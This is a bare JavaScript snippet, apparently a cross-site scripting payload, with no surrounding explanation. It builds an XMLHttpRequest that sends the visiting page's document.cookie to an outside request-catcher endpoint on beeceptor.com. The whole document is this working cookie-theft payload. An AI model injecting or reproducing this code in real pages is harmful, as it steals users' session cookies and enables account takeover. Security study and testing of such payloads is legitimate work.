var xhr = new XMLHttpRequest();
xhr.open("GET", "https://coolendpoint.free.beeceptor.com/?cookie=" + document.cookie, true);
xhr.send();
